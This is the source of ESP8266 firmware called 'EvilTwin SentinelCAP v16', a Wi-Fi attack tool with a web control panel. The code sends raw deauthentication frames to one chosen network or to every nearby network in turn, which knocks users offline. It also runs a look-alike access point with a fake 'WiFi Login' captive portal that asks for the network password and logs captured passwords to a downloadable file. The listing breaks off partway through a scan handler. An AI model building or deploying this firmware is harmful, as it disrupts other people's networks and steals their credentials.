// --- EvilTwin SentinelCAP v16 - MEMORY OPTIMIZED EDITION ---
// Optimized for ESP8266 with severe memory constraints
// Changes: Zero dynamic allocation during operation, static buffers only,
//          streaming JSON, PROGMEM strings, memory pools, watchdog timer

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <ArduinoJson.h>
#include <Updater.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
}

// --- MEMORY OPTIMIZATION: Compile-time configuration ---
// Disable all non-essential features to save RAM
#define ENABLE_SERIAL_DEBUG 0          // Set 1 only for debugging, 0 for production
#define USE_COMPRESSED_TEMPLATES 1     // Use minimal HTML templates
#define MAX_NETWORKS 8                 // Reduced from 16 to save RAM (8*~40 bytes = 320 bytes saved)
#define JSON_BUFFER_SIZE 512           // Static buffer for JSON responses
#define LOG_BUFFER_SIZE 512            // Circular buffer for passwords (not String!)
#define MAX_SSID_LEN 32
#define MAX_BSSID_STR_LEN 18           // "AA:BB:CC:DD:EE:FF\0"
#define MAX_PASS_LEN 64
#define MAX_USER_LEN 32

// --- Global Definitions ---
#define APP_NAME "SentinelCAP"
#define FIRMWARE_VERSION "v16-MEMOPT"
const char DEFAULT_ADMIN_AP_SSID[] PROGMEM = "SentinelCAP";
const char DEFAULT_ADMIN_AP_PASSWORD[] PROGMEM = "sentinel123";
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

const char CAPTURED_PASSWORDS_FILE[] PROGMEM = "/creds.log";
const char SETTINGS_FILE[] PROGMEM = "/config.bin";  // Binary format, not JSON

// --- OLED Definitions ---
#define OLED_SDA_PIN D1
#define OLED_SCL_PIN D2
#define OLED_ADDRESS 0x3C
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// --- Web Server and DNS ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// --- MEMORY POOL: Network Structure (packed to save RAM) ---
typedef struct __attribute__((packed)) {
  char ssid[MAX_SSID_LEN + 1];
  uint8_t ch;
  uint8_t bssid[6];
  int8_t rssi;           // Reduced from int32_t to int8_t (range -128 to 127 is sufficient)
  uint8_t security;      // 0=Open, 1=WEP, 2=WPA, 3=WPA2, 4=Auto
  bool hidden;
} NetworkEntry;

// Static allocation - no heap fragmentation
NetworkEntry networkList[MAX_NETWORKS];
NetworkEntry selectedNetwork;
uint8_t networkCount = 0;

// --- MEMORY POOL: Password Log (circular buffer) ---
char passwordLog[LOG_BUFFER_SIZE];
uint16_t logWriteIndex = 0;
uint16_t logEntryCount = 0;

// --- State Variables (minimized size) ---
bool hotspotActive = false;
bool deauthActive = false;
bool deauthAllMode = false;
uint8_t currentDeauthIndex = 0;

// Timing (using uint32_t for millis() compatibility)
uint32_t lastDeauthTime = 0;
uint32_t lastDeauthAllTime = 0;
uint32_t lastScanTime = 0;
uint32_t startTime = 0;
uint32_t lastOLEDUpdate = 0;

// Attack statistics
uint32_t deauthStartTime = 0;
uint32_t deauthPacketCount = 0;
uint16_t deauthIntervalMs = 1000;  // Calculated from rate

// Evil Twin tracking
uint32_t evilTwinStartTime = 0;
char lastCapturedUser[MAX_USER_LEN] = {0};
char lastCapturedPass[MAX_PASS_LEN] = {0};

// --- Settings Structure (packed binary, not JSON) ---
struct __attribute__((packed)) DeviceSettings {
  char adminApSsid[MAX_SSID_LEN + 1];
  char adminApPassword[MAX_PASS_LEN + 1];
  char webUser[16];
  char webPass[16];
  uint8_t deauthRate;        // packets per second (1-20)
  uint8_t oledMode;          // 0=Idle, 1=Attack, 2=Scan
  uint8_t debugEnabled;      // 0 or 1
  uint8_t checksum;          // Simple integrity check
} settings;

// --- OLED Modes ---
enum OledMode : uint8_t {
  MODE_IDLE = 0,
  MODE_ATTACK,
  MODE_SCAN,
  MODE_MAX
};
const char* const oledModeNames[] PROGMEM = {"Idle", "Attack", "Scan"};

// --- FUNCTION PROTOTYPES ---
void loadSettings();
void saveSettings();
void loadPasswordLog();
void savePasswordLog();
void clearNetworkList();
void performScan();
void updateOLED();

// Web handlers
void handleRoot();
void handleStyleCSS();
void handleScriptJS();
void handleApiScan();
void handleApiSelect();
void handleApiToggleDeauth();
void handleApiToggleHotspot();
void handleApiStatus();
void handleApiLogs();
void handleApiClearLogs();
void handleApiDownloadLogs();
void handleApiFiles();
void handleApiDeselect();
void handleApiGetSettings();
void handleApiSaveSettings();
void handleApiSetOledMode();
void handleCaptivePortal();
void handleCaptiveSubmit();
void handleFileUpload();
void handleFileDelete();
void handleOTAUpdate();
void handleRestart();

// Helpers
bool isAuthenticated();
void streamJsonHeader();
void addToPasswordLog(const char* ssid, const char* user, const char* pass);
void formatBSSID(const uint8_t* bssid, char* out);
bool parseBSSID(const char* str, uint8_t* out);
const char* getSecurityName(uint8_t sec);
uint8_t mapEncryptionType(uint8_t enc);
void printP(const char* pstr);  // PROGMEM string helper

// --- COMPRESSED HTML TEMPLATES (minimal whitespace) ---
// Saved in PROGMEM to avoid RAM usage
const char INDEX_HTML[] PROGMEM = 
"<!DOCTYPE html><html><head>"
"<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>SentinelCAP</title>"
"<style>"
"* {margin:0;padding:0;box-sizing:border-box}"
"body {font-family:system-ui,sans-serif;background:#1a1a1a;color:#fff}"
".wrap {display:flex;min-height:100vh}"
".hdr {position:fixed;top:0;left:0;right:0;height:50px;background:#0f0f0f;display:flex;align-items:center;padding:0 15px;z-index:1000;border-bottom:1px solid #333}"
".logo {color:#ff3333;font-weight:bold;font-size:18px}"
".menu-btn {margin-left:auto;background:none;border:none;color:#ff3333;font-size:20px;cursor:pointer}"
".side {width:220px;background:#0f0f0f;padding-top:60px;position:fixed;height:100vh;overflow-y:auto;border-right:1px solid #333;transform:translateX(-100%);transition:transform .3s}"
".side.show {transform:translateX(0)}"
".nav {display:block;padding:12px 20px;color:#ccc;text-decoration:none;border-bottom:1px solid #222}"
".nav:hover,.nav.active {background:#ff3333;color:#fff}"
".main {flex:1;margin-left:0;padding:60px 15px 15px;transition:margin .3s}"
".grid {display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:20px}"
".card {background:#2a2a2a;border-radius:8px;padding:15px;border:1px solid #444}"
".card h3 {color:#999;font-size:12px;margin-bottom:5px}"
".card .val {color:#fff;font-size:18px;font-weight:bold}"
".btn {background:#333;color:#fff;border:none;padding:10px 15px;border-radius:5px;cursor:pointer;margin:5px}"
".btn:hover {background:#ff3333}"
".btn.r {background:#dc3545}"
".btn.g {background:#28a745}"
".btn.o {background:#fd7e14}"
".btn.p {background:#6f42c1}"
".area {background:#2a2a2a;border-radius:8px;padding:20px;border:1px solid #444;margin-bottom:20px}"
".term {background:#111;border:1px solid #333;border-radius:5px;padding:10px;font-family:monospace;font-size:12px;color:#0f0;height:200px;overflow-y:auto}"
".net {background:#333;border-radius:5px;padding:10px;margin:5px 0;display:flex;justify-content:space-between;align-items:center}"
".net.s {border:2px solid #ff3333}"
".form label {display:block;color:#ccc;margin:10px 0 5px}"
".form input,.form select {width:100%;padding:8px;background:#111;border:1px solid #444;color:#fff;border-radius:4px}"
".hide {display:none}"
".tab {display:none}"
".tab.a {display:block}"
"@media(min-width:768px){.side{transform:translateX(0)}.main{margin-left:220px}.menu-btn{display:none}}"
"</style></head><body>"
"<div class='wrap'>"
"<header class='hdr'><div class='logo'>SentinelCAP</div><button class='menu-btn' onclick='toggleMenu()'>☰</button></header>"
"<nav class='side' id='side'>"
"<a href='#' class='nav active' data-tab='dash'>Dashboard</a>"
"<a href='#' class='nav' data-tab='scan'>Scanner</a>"
"<a href='#' class='nav' data-tab='attack'>Attack</a>"
"<a href='#' class='nav' data-tab='portal'>Portal</a>"
"<a href='#' class='nav' data-tab='files'>Files</a>"
"<a href='#' class='nav' data-tab='logs'>Logs</a>"
"<a href='#' class='nav' data-tab='set'>Settings</a>"
"<a href='#' class='nav' onclick='reboot()'>Reboot</a>"
"</nav>"
"<main class='main' id='main'>"
"<div id='dash' class='tab a'>"
"<div class='grid'>"
"<div class='card'><h3>Target</h3><div class='val' id='t_ssid'>None</div></div>"
"<div class='card'><h3>Evil Twin</h3><div class='val' id='t_twin' style='color:#dc3545'>OFF</div></div>"
"<div class='card'><h3>Deauth</h3><div class='val' id='t_deauth' style='color:#dc3545'>OFF</div></div>"
"<div class='card'><h3>Captured</h3><div class='val' id='t_captured'>0</div></div>"
"</div>"
"<div class='area'>"
"<div class='term' id='term'></div>"
"</div>"
"</div>"
"<div id='scan' class='tab'>"
"<div class='area'>"
"<button class='btn' onclick='scan()'>Scan Networks</button>"
"<button class='btn r' onclick='deselect()'>Deselect</button>"
"<div id='nets'></div>"
"</div>"
"</div>"
"<div id='attack' class='tab'>"
"<div class='area'>"
"<h3 style='color:#ff3333;margin-bottom:15px'>Attack Tools</h3>"
"<button class='btn r' id='btn_deauth' onclick='toggleDeauth(0)'>Start Deauth</button>"
"<button class='btn o' id='btn_deauthall' onclick='toggleDeauth(1)'>Deauth All</button>"
"<button class='btn p' id='btn_twin' onclick='toggleTwin()'>Start Evil Twin</button>"
"</div>"
"</div>"
"<div id='portal' class='tab'>"
"<div class='area'>"
"<h3 style='color:#ff3333;margin-bottom:15px'>Captive Portal</h3>"
"<textarea id='html' style='width:100%;height:300px;background:#111;color:#fff;border:1px solid #444;padding:10px'></textarea>"
"<button class='btn' onclick='savePortal()'>Save Portal</button>"
"<button class='btn g' onclick='deployPortal()'>Deploy</button>"
"</div>"
"</div>"
"<div id='files' class='tab'>"
"<div class='area' id='files'></div>"
"</div>"
"<div id='logs' class='tab'>"
"<div class='area'>"
"<button class='btn r' onclick='clearLogs()'>Clear</button>"
"<button class='btn g' onclick='downloadLogs()'>Download</button>"
"<div class='term' id='logs'></div>"
"</div>"
"</div>"
"<div id='set' class='tab'>"
"<div class='area'>"
"<div class='form'>"
"<label>Admin SSID</label><input id='s_ssid'>"
"<label>Admin Password</label><input id='s_pass' type='password'>"
"<label>Web Username</label><input id='s_user'>"
"<label>Web Password</label><input id='s_wpass' type='password'>"
"<label>Deauth Rate (pkt/s)</label><input id='s_rate' type='number' min='1' max='20' value='1'>"
"<label>OLED Mode</label><select id='s_oled'><option value='0'>Idle</option><option value='1'>Attack</option><option value='2'>Scan</option></select>"
"<button class='btn g' onclick='saveSettings()' style='margin-top:15px'>Save</button>"
"</div>"
"</div>"
"</div>"
"</main></div>"
"<script src='/app.js'></script>"
"</body></html>";

const char APP_JS[] PROGMEM = 
"let cur='dash',sel=null,deauth=0,deauthAll=0,twin=0;"
"function toggleMenu(){document.getElementById('side').classList.toggle('show')}"
"function show(t){document.querySelectorAll('.tab').forEach(e=>e.classList.remove('a'));document.getElementById(t).classList.add('a');document.querySelectorAll('.nav').forEach(e=>e.classList.remove('active'));document.querySelector(`.nav[data-tab=${t}]`).classList.add('active');cur=t;if(t=='scan')loadNets();if(t=='files')loadFiles();if(t=='logs')loadLogs();if(t=='set')loadSet()}"
"document.querySelectorAll('.nav').forEach(n=>n.onclick=e=>{e.preventDefault();if(n.dataset.tab)show(n.dataset.tab)});"
"function log(m){let t=document.getElementById('term');t.innerHTML+=`<div>${new Date().toLocaleTimeString()} ${m}</div>`;t.scrollTop=t.scrollHeight;}"
"async function scan(){log('[*] Scanning...');try{let r=await fetch('/api/scan');let d=await r.json();showNets(d);}catch(e){log('[!] Scan failed');}}"
"function showNets(nets){let h='';nets.forEach((n,i)=>{h+=`<div class='net ${sel==n.bssid?'s':''}'><div><b>${n.hidden?'(Hidden) ':''}${n.ssid}</b><br><small>${n.bssid} Ch${n.ch} ${n.rssi}dBm</small></div><button class='btn' onclick='selectNet(\"${n.bssid}\")'>Select</button></div>`;});document.getElementById('nets').innerHTML=h||'No networks';}"
"async function selectNet(b){try{let r=await fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({bssid:b})});let d=await r.json();if(d.success){sel=b;log('[+] Selected: '+b);showNets(networks);}}catch(e){log('[!] Select failed');}}"
"async function toggleDeauth(all){try{let r=await fetch('/api/deauth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target_all:all})});let d=await r.json();deauth=d.deauth_active;deauthAll=d.deauth_all;updateDeauthUI();log(deauth?'[+] Deauth started':'[+] Deauth stopped');}catch(e){log('[!] Deauth failed');}}"
"function updateDeauthUI(){document.getElementById('btn_deauth').textContent=deauth&&!deauthAll?'Stop Deauth':'Start Deauth';document.getElementById('btn_deauth').className=deauth&&!deauthAll?'btn r':'btn';document.getElementById('btn_deauthall').textContent=deauthAll?'Stop All':'Deauth All';document.getElementById('t_deauth').textContent=deauth?(deauthAll?'ALL':'ON'):'OFF';document.getElementById('t_deauth').style.color=deauth?'#28a745':'#dc3545';}"
"async function toggleTwin(){try{let r=await fetch('/api/twin',{method:'POST'});let d=await r.json();twin=d.active;updateTwinUI();log(twin?'[+] Evil Twin started':'[+] Evil Twin stopped');}catch(e){log('[!] Twin failed');}}"
"function updateTwinUI(){document.getElementById('btn_twin').textContent=twin?'Stop Twin':'Start Twin';document.getElementById('t_twin').textContent=twin?'ON':'OFF';document.getElementById('t_twin').style.color=twin?'#28a745':'#dc3545';}"
"async function deselect(){try{await fetch('/api/deselect',{method:'POST'});sel=null;deauth=deauthAll=twin=0;updateDeauthUI();updateTwinUI();document.getElementById('t_ssid').textContent='None';log('[+] Deselected');}catch(e){}}"
"async function loadNets(){try{let r=await fetch('/api/scan');let d=await r.json();showNets(d);}catch(e){}}"
"async function loadFiles(){try{let r=await fetch('/api/files');let d=await r.json();let h='';d.forEach(f=>{h+=`<div class='net'><div><b>${f.name}</b><br><small>${f.size}b</small></div><button class='btn r' onclick='delFile(\"${f.name}\")'>Del</button></div>`;});document.getElementById('files').innerHTML=h||'No files';}catch(e){}}"
"async function delFile(f){if(!confirm('Delete '+f+'?'))return;try{await fetch('/api/delfile',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:f})});loadFiles();}catch(e){}}"
"async function loadLogs(){try{let r=await fetch('/api/logs');let d=await r.json();document.getElementById('logs').innerHTML=d.logs||'No logs';document.getElementById('t_captured').textContent=d.count||0;}catch(e){}}"
"async function clearLogs(){try{await fetch('/api/clearlogs',{method:'POST'});loadLogs();}catch(e){}}"
"function downloadLogs(){window.open('/api/downloadlogs','_blank');}"
"async function loadSet(){try{let r=await fetch('/api/settings');let d=await r.json();document.getElementById('s_ssid').value=d.apssid;document.getElementById('s_pass').value=d.appass;document.getElementById('s_user').value=d.webuser;document.getElementById('s_wpass').value=d.webpass;document.getElementById('s_rate').value=d.rate;document.getElementById('s_oled').value=d.oled;}catch(e){}}"
"async function saveSettings(){let s={adminApSsid:document.getElementById('s_ssid').value,adminApPassword:document.getElementById('s_pass').value,webAdminUsername:document.getElementById('s_user').value,webAdminPassword:document.getElementById('s_wpass').value,deauthPacketRate:parseInt(document.getElementById('s_rate').value),oledDisplayMode:parseInt(document.getElementById('s_oled').value)};try{await fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(s)});log('[+] Settings saved');}catch(e){log('[!] Save failed');}}"
"function reboot(){if(confirm('Reboot device?')){fetch('/restart',{method:'POST'});setTimeout(()=>location.reload(),5000);}}"
"setInterval(async()=>{try{let r=await fetch('/api/status');let d=await r.json();document.getElementById('t_ssid').textContent=d.target||'None';document.getElementById('t_captured').textContent=d.captured||0;if(cur=='logs')loadLogs();}catch(e){}},3000);"
"show('dash');";

const char CAPTIVE_HTML[] PROGMEM = 
"<!DOCTYPE html><html><head>"
"<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>WiFi Login</title>"
"<style>"
"body{font-family:system-ui,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
".box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:90%;max-width:400px;text-align:center}"
"h1{color:#333;margin-bottom:10px}"
"p{color:#666;margin-bottom:20px}"
"input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}"
"button{width:100%;background:#1877f2;color:#fff;padding:12px;border:none;border-radius:4px;font-size:16px;cursor:pointer}"
".small{color:#999;font-size:12px;margin-top:20px}"
"</style></head><body>"
"<div class='box'>"
"<h1>Connect to WiFi</h1>"
"<p>Enter password for <b>{SSID}</b></p>"
"<form action='/submit' method='post'>"
"<input type='password' name='p' placeholder='WiFi Password' required>"
"<button type='submit'>Connect</button>"
"</form>"
"<p class='small'>Powered by SentinelCAP</p>"
"</div></body></html>";

// --- SETUP ---
void setup() {
  // Initialize watchdog timer (8 seconds timeout)
  ESP.wdtEnable(8000);
  
  #if ENABLE_SERIAL_DEBUG
  Serial.begin(115200);
  Serial.printf_P(PSTR("\n[INFO] %s %s booting...\n"), APP_NAME, FIRMWARE_VERSION);
  Serial.printf_P(PSTR("[MEM] Free heap at boot: %d bytes\n"), ESP.getFreeHeap());
  #endif

  // Initialize I2C and OLED
  Wire.begin(OLED_SDA_PIN, OLED_SCL_PIN);
  if(!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
    #if ENABLE_SERIAL_DEBUG
    Serial.println(F("[FATAL] OLED init failed"));
    #endif
    ESP.restart();
  }
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println(F("SentinelCAP v16"));
  display.println(F("Memory Optimized"));
  display.display();
  delay(1000);

  // Initialize SPIFFS with error handling
  if (!SPIFFS.begin()) {
    #if ENABLE_SERIAL_DEBUG
    Serial.println(F("[WARN] SPIFFS mount failed, formatting..."));
    #endif
    SPIFFS.format();
    if (!SPIFFS.begin()) {
      display.clearDisplay();
      display.println(F("SPIFFS FAIL!"));
      display.display();
      delay(2000);
      ESP.restart();
    }
  }

  // Initialize memory pools
  memset(networkList, 0, sizeof(networkList));
  memset(&selectedNetwork, 0, sizeof(selectedNetwork));
  memset(passwordLog, 0, LOG_BUFFER_SIZE);
  
  // Load settings and logs
  loadSettings();
  loadPasswordLog();

  // Configure WiFi
  WiFi.persistent(false);  // CRITICAL: Prevents flash wear and speeds up boot
  WiFi.setAutoReconnect(false);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(settings.adminApSsid, settings.adminApPassword);

  // Start DNS server
  dnsServer.start(DNS_PORT, "*", apIP);

  // Enable promiscuous mode for deauth
  wifi_promiscuous_enable(1);

  // Setup web server routes
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/app.js", HTTP_GET, handleScriptJS);
  webServer.on("/style.css", HTTP_GET, handleStyleCSS);
  
  // API endpoints
  webServer.on("/api/scan", HTTP_GET, handleApiScan);
  webServer.on("/api/select", HTTP_POST, handleApiSelect);
  webServer.on("/api/deauth", HTTP_POST, handleApiToggleDeauth);
  webServer.on("/api/twin", HTTP_POST, handleApiToggleHotspot);
  webServer.on("/api/status", HTTP_GET, handleApiStatus);
  webServer.on("/api/logs", HTTP_GET, handleApiLogs);
  webServer.on("/api/clearlogs", HTTP_POST, handleApiClearLogs);
  webServer.on("/api/downloadlogs", HTTP_GET, handleApiDownloadLogs);
  webServer.on("/api/files", HTTP_GET, handleApiFiles);
  webServer.on("/api/delfile", HTTP_POST, handleFileDelete);
  webServer.on("/api/deselect", HTTP_POST, handleApiDeselect);
  webServer.on("/api/settings", HTTP_GET, handleApiGetSettings);
  webServer.on("/api/settings", HTTP_POST, handleApiSaveSettings);
  webServer.on("/api/setoled", HTTP_POST, handleApiSetOledMode);
  
  // Upload and OTA
  webServer.on("/upload", HTTP_POST, handleFileUpload);
  webServer.on("/update", HTTP_POST, handleOTAUpdate);
  webServer.on("/restart", HTTP_POST, handleRestart);
  
  // Captive portal
  webServer.on("/generate", HTTP_GET, handleCaptivePortal);
  webServer.on("/submit", HTTP_POST, handleCaptiveSubmit);
  
  webServer.onNotFound(handleCaptivePortal);

  webServer.begin();
  
  startTime = millis();
  lastOLEDUpdate = millis();
  
  #if ENABLE_SERIAL_DEBUG
  Serial.printf_P(PSTR("[MEM] Free heap after init: %d bytes\n"), ESP.getFreeHeap());
  #endif
  
  updateOLED();
}

// --- MAIN LOOP ---
void loop() {
  // Feed watchdog
  ESP.wdtFeed();
  
  // Handle network services
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauth attack logic
  if (deauthActive) {
    uint32_t now = millis();
    
    if (deauthAllMode) {
      if (now - lastDeauthAllTime >= (uint32_t)deauthIntervalMs) {
        if (networkCount > 0) {
          // Rotate through all networks
          NetworkEntry* target = &networkList[currentDeauthIndex];
          
          // Send deauth packet
          uint8_t deauthPacket[26] = {
            0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00
          };
          
          memcpy(&deauthPacket[10], target->bssid, 6);
          memcpy(&deauthPacket[16], target->bssid, 6);
          
          wifi_set_channel(target->ch);
          wifi_send_pkt_freedom(deauthPacket, 26, 0);
          
          deauthPacketCount++;
          currentDeauthIndex = (currentDeauthIndex + 1) % networkCount;
        }
        lastDeauthAllTime = now;
      }
      
      // Periodic rescan every 15 seconds
      if (now - lastScanTime >= 15000) {
        performScan();
        lastScanTime = now;
      }
      
    } else {
      // Single target deauth
      if (now - lastDeauthTime >= (uint32_t)deauthIntervalMs) {
        if (selectedNetwork.ssid[0] != '\0' || selectedNetwork.hidden) {
          uint8_t deauthPacket[26] = {
            0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00
          };
          
          memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
          memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
          
          wifi_set_channel(selectedNetwork.ch);
          wifi_send_pkt_freedom(deauthPacket, 26, 0);
          
          deauthPacketCount++;
        } else {
          deauthActive = false;  // Stop if no target
        }
        lastDeauthTime = now;
      }
    }
  }

  // OLED update (1Hz)
  if (millis() - lastOLEDUpdate >= 1000) {
    updateOLED();
    lastOLEDUpdate = millis();
  }
  
  // Yield to prevent watchdog timeout
  yield();
}

// --- MEMORY-EFFICIENT SETTINGS MANAGEMENT ---
void loadSettings() {
  // Default values
  strncpy_P(settings.adminApSsid, DEFAULT_ADMIN_AP_SSID, MAX_SSID_LEN);
  strncpy_P(settings.adminApPassword, DEFAULT_ADMIN_AP_PASSWORD, MAX_PASS_LEN);
  strcpy(settings.webUser, "admin");
  strcpy(settings.webPass, "password");
  settings.deauthRate = 1;
  settings.oledMode = MODE_IDLE;
  settings.debugEnabled = 0;
  
  File f = SPIFFS.open(FPSTR(SETTINGS_FILE), "r");
  if (f) {
    if (f.size() == sizeof(DeviceSettings)) {
      f.read((uint8_t*)&settings, sizeof(DeviceSettings));
      // Verify checksum
      uint8_t checksum = 0;
      for (size_t i = 0; i < sizeof(DeviceSettings) - 1; i++) {
        checksum ^= ((uint8_t*)&settings)[i];
      }
      if (checksum != settings.checksum) {
        // Corrupted, use defaults
        strncpy_P(settings.adminApSsid, DEFAULT_ADMIN_AP_SSID, MAX_SSID_LEN);
        strncpy_P(settings.adminApPassword, DEFAULT_ADMIN_AP_PASSWORD, MAX_PASS_LEN);
      }
    }
    f.close();
  }
  
  // Calculate interval
  deauthIntervalMs = 1000 / settings.deauthRate;
}

void saveSettings() {
  // Calculate checksum
  settings.checksum = 0;
  for (size_t i = 0; i < sizeof(DeviceSettings) - 1; i++) {
    settings.checksum ^= ((uint8_t*)&settings)[i];
  }
  
  File f = SPIFFS.open(FPSTR(SETTINGS_FILE), "w");
  if (f) {
    f.write((const uint8_t*)&settings, sizeof(DeviceSettings));
    f.close();
  }
}

// --- MEMORY-EFFICIENT PASSWORD LOG ---
void loadPasswordLog() {
  File f = SPIFFS.open(FPSTR(CAPTURED_PASSWORDS_FILE), "r");
  if (f) {
    size_t len = f.readBytes(passwordLog, LOG_BUFFER_SIZE - 1);
    passwordLog[len] = '\0';
    
    // Count entries
    logEntryCount = 0;
    for (size_t i = 0; i < len; i++) {
      if (passwordLog[i] == '\n') logEntryCount++;
    }
    f.close();
  }
}

void savePasswordLog() {
  File f = SPIFFS.open(FPSTR(CAPTURED_PASSWORDS_FILE), "w");
  if (f) {
    // Write circular buffer in correct order
    if (logWriteIndex < LOG_BUFFER_SIZE && passwordLog[logWriteIndex] != '\0') {
      // Buffer has wrapped, write second part first
      f.write((const uint8_t*)(passwordLog + logWriteIndex), LOG_BUFFER_SIZE - logWriteIndex);
    }
    if (logWriteIndex > 0) {
      f.write((const uint8_t*)passwordLog, logWriteIndex);
    }
    f.close();
  }
}

void addToPasswordLog(const char* ssid, const char* user, const char* pass) {
  char entry[128];
  snprintf(entry, sizeof(entry), "[%lu] SSID:%s USER:%s PASS:%s\n", 
           millis() / 1000, ssid, user, pass);
  
  size_t entryLen = strlen(entry);
  
  // Circular buffer write
  for (size_t i = 0; i < entryLen; i++) {
    passwordLog[logWriteIndex] = entry[i];
    logWriteIndex = (logWriteIndex + 1) % LOG_BUFFER_SIZE;
  }
  
  logEntryCount++;
  savePasswordLog();
  
  // Update last captured
  strncpy(lastCapturedUser, user, MAX_USER_LEN - 1);
  lastCapturedUser[MAX_USER_LEN - 1] = '\0';
  strncpy(lastCapturedPass, pass, MAX_PASS_LEN - 1);
  lastCapturedPass[MAX_PASS_LEN - 1] = '\0';
}

// --- NETWORK SCANNING ---
void clearNetworkList() {
  memset(networkList, 0, sizeof(networkList));
  networkCount = 0;
}

void performScan() {
  #if ENABLE_SERIAL_DEBUG
  Serial.println(F("[SCAN] Starting..."));
  #endif
  
  int n = WiFi.scanNetworks(false, true);  // true = show hidden
  clearNetworkList();
  
  if (n > 0) {
    for (int i = 0; i < n && networkCount < MAX_NETWORKS; i++) {
      NetworkEntry* net = &networkList[networkCount];
      
      strncpy(net->ssid, WiFi.SSID(i).c_str(), MAX_SSID_LEN);
      net->ssid[MAX_SSID_LEN] = '\0';
      
      for (int j = 0; j < 6; j++) {
        net->bssid[j] = WiFi.BSSID(i)[j];
      }
      
      net->ch = WiFi.channel(i);
      net->rssi = (int8_t)WiFi.RSSI(i);  // Cast to save memory
      net->security = mapEncryptionType(WiFi.encryptionType(i));
      net->hidden = (net->ssid[0] == '\0');
      
      networkCount++;
    }
  }
  
  WiFi.scanDelete();  // CRITICAL: Free scan results from WiFi library heap
  
  #if ENABLE_SERIAL_DEBUG
  Serial.printf_P(PSTR("[SCAN] Found %d networks, free heap: %d\n"), 
                  networkCount, ESP.getFreeHeap());
  #endif
}

uint8_t mapEncryptionType(uint8_t enc) {
  switch (enc) {
    case ENC_TYPE_NONE: return 0;
    case ENC_TYPE_WEP: return 1;
    case ENC_TYPE_TKIP: return 2;
    case ENC_TYPE_CCMP: return 3;
    case ENC_TYPE_AUTO: return 4;
    default: return 0;
  }
}

const char* getSecurityName(uint8_t sec) {
  switch (sec) {
    case 0: return PSTR("Open");
    case 1: return PSTR("WEP");
    case 2: return PSTR("WPA");
    case 3: return PSTR("WPA2");
    case 4: return PSTR("Auto");
    default: return PSTR("Unknown");
  }
}

void formatBSSID(const uint8_t* bssid, char* out) {
  snprintf(out, MAX_BSSID_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

bool parseBSSID(const char* str, uint8_t* out) {
  return sscanf(str, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
                &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

// --- WEB HANDLERS (Streaming, no large buffers) ---
bool isAuthenticated() {
  if (settings.webUser[0] == '\0' || settings.webPass[0] == '\0') return true;
  return webServer.authenticate(settings.webUser, settings.webPass);
}

void handleRoot() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  // Stream PROGMEM content directly
  webServer.sendHeader("Content-Encoding", "identity");
  webServer.setContentLength(strlen_P(INDEX_HTML));
  webServer.send(200, "text/html", "");
  
  const char* ptr = INDEX_HTML;
  char buffer[256];
  while (strlen_P(ptr) > 0) {
    strncpy_P(buffer, ptr, 255);
    buffer[255] = '\0';
    webServer.sendContent(buffer);
    ptr += 255;
  }
}

void handleScriptJS() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  webServer.setContentLength(strlen_P(APP_JS));
  webServer.send(200, "application/javascript", "");
  
  const char* ptr = APP_JS;
  char buffer[256];
  while (strlen_P(ptr) > 0) {
    strncpy_P(buffer, ptr, 255);
    buffer[255] = '\0';
    webServer.sendContent(buffer);
    ptr += 255;
  }
}

void handleStyleCSS() {
  // CSS is embedded in HTML for memory efficiency, but handle if requested
  webServer.send(404);
}

// --- API HANDLERS (StaticJsonDocument only) ---
void handleApiScan() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  // Use static buffer on stack - no heap allocation
  StaticJsonDocument<JSON_BUFFER_SIZE> doc;
  JsonArray arr = doc.to<JsonArray>();
  
  for (uint8_t i = 0; i < networkCount; i++) {
    NetworkEntry* net = &networkList[i];
    JsonObject obj = arr.createNestedObject();
    
    obj["ssid"] = net->ssid;
    
